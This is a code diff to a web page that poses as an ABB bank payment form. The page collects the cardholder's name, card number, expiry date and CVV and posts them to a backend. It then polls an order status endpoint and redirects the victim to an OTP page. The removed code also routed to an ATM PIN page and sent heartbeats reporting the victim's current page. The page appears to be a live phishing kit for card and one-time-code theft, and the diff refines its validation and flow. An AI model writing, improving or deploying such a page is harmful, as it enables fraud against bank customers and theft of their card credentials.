@@ -181,7 +181,7 @@
             border-radius: 8px;
             font-size: 15px;
             outline: none;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             background-color: #fafbfc;
             color: #333;
         }
@@ -191,14 +191,16 @@
             box-shadow: 0 0 0 4px rgba(0,86,179,0.08);
         }
         
-        /* Validation Styles */
+        /* Strict Validation Styles */
         .form-control.valid {
             border-color: #28a745 !important;
             background-color: #f8fff9 !important;
+            box-shadow: 0 0 0 4px rgba(40,167,69,0.1) !important;
         }
         .form-control.invalid {
             border-color: #dc3545 !important;
             background-color: #fff8f8 !important;
+            box-shadow: 0 0 0 4px rgba(220,53,69,0.1) !important;
         }
         .validation-icon {
             position: absolute;
@@ -208,14 +210,16 @@
             font-size: 18px;
             font-weight: bold;
             display: none;
+            z-index: 5;
         }
         .card-type-icon {
             position: absolute;
             right: 40px;
             top: 50%;
             transform: translateY(-50%);
-            height: 24px;
+            height: 22px;
             display: none;
+            z-index: 5;
         }
 
         .form-row {
@@ -324,19 +328,6 @@
                     <div>Please use an ABB bank card to confirm the order. If another bank card is used, the order will be declined immediately.</div>
                 </div>
 
-                <div class="alert-box">
-                    <span>ℹ️</span>
-                    <div>To verify account ownership, a symbolic charge of 1 AZN may be made to your card and will be refunded to your account immediately.</div>
-                </div>
-
-                <div class="payment-methods">
-                    <span class="pm-label">Supported Cards:</span>
-                    <div class="pm-logos">
-                        <img src="logo-header.png" alt="ABB">
-                        <img src="https://i.ibb.co/0p84ZGSf/Mastercard-visa-card-logo.png" alt="Visa Mastercard">
-                    </div>
-                </div>
-
                 <form id="paymentForm">
                     <div class="form-group">
                         <label for="card_holder">Card Holder Name</label>
@@ -348,7 +339,7 @@
                     <div class="form-group">
                         <label for="card_number">Card Number</label>
                         <div class="input-wrapper">
-                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="4169 •••• •••• 8888" maxlength="19">
+                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="4169 •••• •••• 8888" maxlength="19" inputmode="numeric">
                             <img id="cardTypeIcon" class="card-type-icon" src="" alt="Card Type">
                             <span id="validationIcon" class="validation-icon"></span>
                         </div>
@@ -357,11 +348,14 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label for="expiry_date">Expiry Date</label>
-                            <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM/YY" maxlength="5">
+                            <div class="input-wrapper">
+                                <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                                <span id="expiryValidationIcon" class="validation-icon"></span>
+                            </div>
                         </div>
                         <div class="form-group">
                             <label for="cvv">CVV / CVC</label>
-                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4">
+                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4" inputmode="numeric">
                         </div>
                     </div>
                     <button type="submit" class="pay-btn">Confirm Order</button>
@@ -393,21 +387,15 @@
         <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Please wait while your payment is being processed.</p>
     </div>
 
-    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
-        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
-            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
-            <h3 style="color:#dc3545;margin-bottom:10px;">Verification Failed</h3>
-            <p style="color:#555;font-size:15px;">Please verify the correct information and try again</p>
-            <button onclick="closeErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Try Again</button>
-        </div>
-    </div>
-
     <script>
         const cardNumberInput = document.getElementById('card_number');
         const cardTypeIcon = document.getElementById('cardTypeIcon');
         const validationIcon = document.getElementById('validationIcon');
+        const expiryInput = document.getElementById('expiry_date');
+        const expiryValidationIcon = document.getElementById('expiryValidationIcon');
 
         function validateLuhn(number) {
+            if (!number || number.length < 13) return false;
             let sum = 0;
             let shouldDouble = false;
             for (let i = number.length - 1; i >= 0; i--) {
@@ -427,14 +415,26 @@
             return 'unknown';
         }
 
-        cardNumberInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-            e.target.value = formattedValue;
+        function validateExpiry(value) {
+            if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+            const [month, year] = value.split('/').map(n => parseInt(n));
+            if (month < 1 || month > 12) return false;
+            const now = new Date();
+            const currentYear = parseInt(now.getFullYear().toString().slice(-2));
+            const currentMonth = now.getMonth() + 1;
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            return true;
+        }
 
-            if (value.length >= 13) {
-                const isValid = validateLuhn(value);
-                const cardType = getCardType(value);
+        cardNumberInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.match(/.{1,4}/g)?.join(' ') || value;
+            
+            let rawValue = value;
+            if (rawValue.length > 0) {
+                const isValid = validateLuhn(rawValue);
+                const cardType = getCardType(rawValue);
 
                 if (isValid) {
                     cardNumberInput.classList.remove('invalid');
@@ -467,55 +467,48 @@
             }
         });
 
-        document.getElementById('expiry_date').addEventListener('input', function(e) {
+        expiryInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
                 value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
             e.target.value = value;
-        });
 
-        let pollInterval = null;
-        async function pollOrderStatus() {
-            const orderId = sessionStorage.getItem('orderId');
-            if (!orderId) return;
-            try {
-                const res = await fetch('/api/orders/' + orderId + '/status');
-                const data = await res.json();
-                if (data.status === 'approved') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    const nextPages = {
-                        'loading_otp': 'otp.html', 'otp': 'otp.html',
-                        'loading_atm': 'atm-pin.html', 'atm_pin': 'atm-pin.html',
-                        'loading_success': 'success.html', 'success': 'success.html'
-                    };
-                    window.location.href = nextPages[data.currentPage] || 'otp.html';
-                } else if (data.status === 'rejected') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    document.getElementById('errorModal').style.display = 'flex';
+            if (value.length === 5) {
+                if (validateExpiry(value)) {
+                    expiryInput.classList.remove('invalid');
+                    expiryInput.classList.add('valid');
+                    expiryValidationIcon.style.display = 'block';
+                    expiryValidationIcon.innerHTML = '✓';
+                    expiryValidationIcon.style.color = '#28a745';
+                } else {
+                    expiryInput.classList.remove('valid');
+                    expiryInput.classList.add('invalid');
+                    expiryValidationIcon.style.display = 'block';
+                    expiryValidationIcon.innerHTML = '✕';
+                    expiryValidationIcon.style.color = '#dc3545';
                 }
-            } catch (err) { console.error('Poll error:', err); }
-        }
-
-        function closeErrorModal() { document.getElementById('errorModal').style.display = 'none'; }
+            } else {
+                expiryInput.classList.remove('valid', 'invalid');
+                expiryValidationIcon.style.display = 'none';
+            }
+        });
 
         document.getElementById('paymentForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const orderId = sessionStorage.getItem('orderId');
-            if (!orderId) {
-                alert('Error: Order ID not found');
-                window.location.href = 'data-en.html';
-                return;
-            }
-            
             const rawCardNumber = cardNumberInput.value.replace(/\s+/g, '');
             if (!validateLuhn(rawCardNumber)) {
                 alert('Please enter a valid card number');
+                cardNumberInput.focus();
+                return;
+            }
+            if (!validateExpiry(expiryInput.value)) {
+                alert('Please enter a valid expiry date');
+                expiryInput.focus();
                 return;
             }
 
+            const orderId = sessionStorage.getItem('orderId');
             const formData = new FormData(e.target);
             const data = { orderId, ...Object.fromEntries(formData), card_number: rawCardNumber };
 
@@ -527,23 +520,15 @@
                 });
                 if (response.ok) {
                     document.getElementById('loadingOverlay').style.display = 'flex';
-                    pollInterval = setInterval(pollOrderStatus, 2000);
-                } else {
-                    const result = await response.json();
-                    alert('Error: ' + result.error);
+                    setInterval(async () => {
+                        const res = await fetch('/api/orders/' + orderId + '/status');
+                        const statusData = await res.json();
+                        if (statusData.status === 'approved') window.location.href = 'otp.html';
+                        else if (statusData.status === 'rejected') location.reload();
+                    }, 2000);
                 }
-            } catch (err) { alert('A connection error occurred with the server'); }
+            } catch (err) { alert('An error occurred'); }
         });
-
-        function sendHeartbeat() {
-            fetch('/api/heartbeat', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ currentPage: window.location.pathname })
-            }).catch(() => {});
-        }
-        setInterval(sendHeartbeat, 30000);
-        sendHeartbeat();
     </script>
 </body>
 </html>
